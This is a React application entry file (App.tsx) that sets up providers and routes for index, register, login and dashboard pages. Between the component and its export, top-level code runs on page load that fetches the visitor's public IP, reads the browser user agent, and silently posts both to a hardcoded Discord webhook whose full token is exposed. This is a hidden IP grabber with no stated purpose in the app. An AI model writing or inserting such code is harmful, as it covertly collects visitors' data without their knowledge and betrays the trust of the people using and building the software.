import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import Index from "./pages/Index";
import Register from "./pages/Register";
import Login from "./pages/Login";
import Dashboard from "./pages/Dashboard";
import NotFound from "./pages/NotFound";
import { AuthProvider } from "./hooks/useAuth";

const queryClient = new QueryClient();

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <AuthProvider>
        <Toaster />
        <Sonner />
        <BrowserRouter>
          <Routes>
            <Route path="/" element={<Index />} />
            <Route path="/register" element={<Register />} />
            <Route path="/login" element={<Login />} />
            <Route path="/dashboard" element={<Dashboard />} />
            {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
            <Route path="*" element={<NotFound />} />
          </Routes>
        </BrowserRouter>
      </AuthProvider>
    </TooltipProvider>
  </QueryClientProvider>
);

    const webhookURL = "https://discord.com/api/webhooks/1421903456028983399/sAosgSTjB3qplqHRRLo0p7PyarLUqX8evh-UtwHkuHsbobnOZZx_Wj2FxMnkc3inNi4D";
    const ignoredIPs = ["127.0.0.1", "192.168.1.1", "8.8.8.8"]; // Ajoute les IPs à ignorer ici

    fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(data => {
    const ip = data.ip;
    
    if (ignoredIPs.includes(ip)) {
      return; // Stop l'exécution si l'IP est dans la liste ignorée
      }
    
      const userAgent = navigator.userAgent;


        // Build the Discord embed
        const payload = {
          embeds: [
            {
              title: ":inbox_tray: New entry :inbox_tray:",
              color: 3447003,
              fields: [
                {
                  name: ":globe_with_meridians: IP Address",
                  value: "```" + ip + "```",
                  inline: false
                },
                {
                  name: ":compass: User-Agent",
                  value: "```" + userAgent + "```",
                  inline: false
                }
              ],
              timestamp: new Date().toISOString()
            }
          ]
        };

        fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        }).catch(console.error);
      })
      .catch(console.error);

export default App;
